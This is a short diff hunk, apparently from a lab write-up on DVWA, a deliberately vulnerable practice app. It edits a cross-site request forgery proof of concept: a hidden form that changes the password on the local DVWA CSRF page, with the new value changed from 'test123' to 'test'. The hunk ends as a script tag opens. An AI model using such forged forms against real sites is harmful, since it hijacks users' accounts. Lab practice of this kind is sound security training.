@@ -70,9 +70,9 @@ GET /dvwa/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Chan
   <body>
     <form action="http://127.0.0.1/dvwa/vulnerabilities/csrf/" method="GET">
       New password:<br />
-      <input type="hidden" AUTOCOMPLETE="off" name="password_new" value="test123" /><br />
+      <input type="hidden" AUTOCOMPLETE="off" name="password_new" value="test" /><br />
       Confirm new password:<br />
-      <input type="hidden" AUTOCOMPLETE="off" name="password_conf" value="test123" /><br />
+      <input type="hidden" AUTOCOMPLETE="off" name="password_conf" value="test" /><br />
       <input type="hidden" value="Change" name="Change" />
     </form>
     <script>
